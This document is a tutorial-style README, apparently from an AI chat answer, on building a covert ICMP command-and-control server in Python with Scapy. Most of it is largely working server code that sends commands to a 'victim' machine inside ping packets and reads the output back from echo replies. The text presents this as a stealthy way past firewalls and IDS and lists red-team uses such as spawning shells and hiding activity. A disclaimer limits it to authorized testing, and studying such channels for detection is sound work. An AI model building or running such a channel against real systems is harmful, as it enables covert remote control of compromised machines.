# 🕵️‍♂️ Covert ICMP C2 (Command & Control) Using Python

## ICMP
✅ **Internet Control Message Protocol (ICMP)**  
✅ Used for sending error messages and operational information about network communication.  
✅ Used by network devices such as routers and hosts.

---

## 🔑 Key Features of ICMP

### ❌ Error Reporting  
ICMP informs the sender when something has gone wrong in the network.

### 🛠️ Diagnostic Tools  
Used by tools like `ping` and `traceroute` to test connectivity and measure latency.

### 📦🚫 Not Used for Data Transfer  
Unlike TCP or UDP, ICMP doesn't carry application-layer data — it reports network-related status and diagnostics.

---

## 🚨 Security Concerns

### 🌊 ICMP Flood  
A type of DoS attack using excessive ICMP requests.

### 💀 Ping of Death  
A malformed or oversized ICMP packet that historically could crash systems.

### 🏴‍☠️ Smurf Attack  
Uses ICMP amplification to overwhelm a target.

---

## Overview
This tool uses ICMP (ping) packets for covert communication between an attacker (C2 server) and a compromised machine (client). Since many firewalls don't block ICMP Echo Requests/Replies, this technique can sometimes bypass basic security controls.

- ✅ **Attacker** → sends ICMP packets with a command.  
- ✅ **Victim** → executes the command and responds with output embedded in ICMP replies.

---

## 🛠️ Requirements
```bash
pip install scapy
🚀 Why these libraries are used
1️⃣ scapy.all (Scapy) 🛰️

Scapy is a powerful packet manipulation library in Python.

It allows you to capture, modify, and send network packets.

Common use cases in red teaming: ARP spoofing, DNS spoofing, packet sniffing, ICMP covert channels.

Example (capturing packets):

python
Copy code
from scapy.all import sniff
sniff(prn=lambda pkt: pkt.summary(), count=5)
2️⃣ subprocess (System Commands) 🖥️

Used to execute system commands from Python.

In red teaming used for running OS commands (ipconfig, netstat, whoami), executing tools (msfconsole, nmap), spawning shells.

Example (running whoami):

python
Copy code
import subprocess
result = subprocess.run(["whoami"], capture_output=True, text=True)
print(result.stdout)
3️⃣ os (Operating System Functions) ⚙️

Provides functions to interact with the OS.

Used for file manipulation (os.remove, os.rename), environment variables (os.getenv), changing directories (os.chdir), etc.

Example (killing a process):

python
Copy code
import os
os.system("taskkill /F /IM notepad.exe")
🎯 How These Are Used Together in Red Teaming
Imagine a script that:

Uses Scapy to sniff packets.

Uses subprocess to execute system commands.

Uses os to manage files or hide activities.

📊 Summary Table
Library	Purpose in Red Teaming
scapy.all 🛰️	Packet sniffing, ARP/DNS spoofing, covert channels
subprocess 🖥️	Running OS commands, launching exploits, spawning shells
os ⚙️	File manipulation, process management, hiding activity

🕵️‍♂️🚀 Explanation: ICMP-Based C2 Server (Overview)
This script implements a covert command & control (C2) server using ICMP (ping packets) to send and receive commands from a compromised machine (victim).

📝 Breakdown of the Code (Conceptual / Pseudocode)
1️⃣ Class Definition
python
Copy code
class ICMPServer:
    def __init__(self, victim_ip):
        self.victim_ip = victim_ip
Define a class to manage ICMP-based communication.

__init__ initializes the C2 server with the target victim IP and stores it.

2️⃣ Sending Commands (Covert ICMP packets)
python
Copy code
def send_command(self, command):
    packet = IP(dst=self.victim_ip) / ICMP(type=8) / Raw(load=command)
    send(packet, verbose=False)
    print(f"[+] Sent command: {command}")
Creates an IP packet to the victim, uses ICMP echo request (type 8), embeds the command in Raw(load=...), and sends it.

3️⃣ Receiving Command Responses
python
Copy code
def receive_response(timeout=5):
    def packet_callback(packet):
        if packet.haslayer(ICMP) and packet[ICMP].type == 0:  # Echo Reply
            if packet.haslayer(Raw):
                output = packet[Raw].load.decode(errors="ignore")
                print(f"[+] Command output:\n{output}")
            else:
                print("[!] Received empty response.")
    sniff(filter="icmp", prn=packet_callback, timeout=timeout, store=0)
Captures incoming ICMP echo replies (type 0), extracts Raw payload if present, decodes and prints it.

4️⃣ Interactive Command Loop (correct placement inside the class)
python
Copy code
def start(self):
    while True:
        cmd = input("C2 > ")
        if cmd.lower() in ["exit", "quit"]:
            break
        self.send_command(cmd)
        self.receive_response()
Properly encapsulated loop to accept operator commands, send them, and wait for responses.

5️⃣ Running the ICMP C2 Server
python
Copy code
if __name__ == "__main__":
    server = ICMPServer(victim_ip="192.168.1.50")  # Change victim IP
    server.start()
Run when executed directly; creates server instance and launches interactive session.

📌 What This Code Does (Summary)
✅ Acts as a covert C2 server using ICMP packets.

✅ Sends commands to the victim via ping packets.

✅ Receives responses using ICMP Echo Replies.

✅ Attempts stealth by using a protocol often allowed in networks.

🔹 How It Works (Flow)
Attacker runs the C2 server (icmp_c2_server.py).

Victim runs the listener (icmp_c2_client.py).

Attacker sends a command (e.g., ls, whoami, ipconfig).

Victim executes the command and sends back output via ICMP reply.

🔥 Why Use ICMP for C2?
✅ Stealthy – ICMP is often allowed by firewalls.

✅ No persistent TCP connection – Harder to detect with simple rules.

✅ May bypass basic IDS/IPS – Traffic can look like normal ping traffic.

🛑 Disclaimer
This content is for educational and authorized security testing only. Unauthorized use of these techniques against systems you do not own or have explicit permission to test is illegal and unethical. Always conduct testing in a controlled lab environment with proper authorization. 🚨

markdown
Copy code

If you want, I can:
- convert the pseudocode to fully **non-executable, high-level flow diagrams**, or  
- export this as a ready-to-use `README.md` file, or  
- add an **ASCII architecture diagram** (client ⇄ network ⇄ server) for clarity.
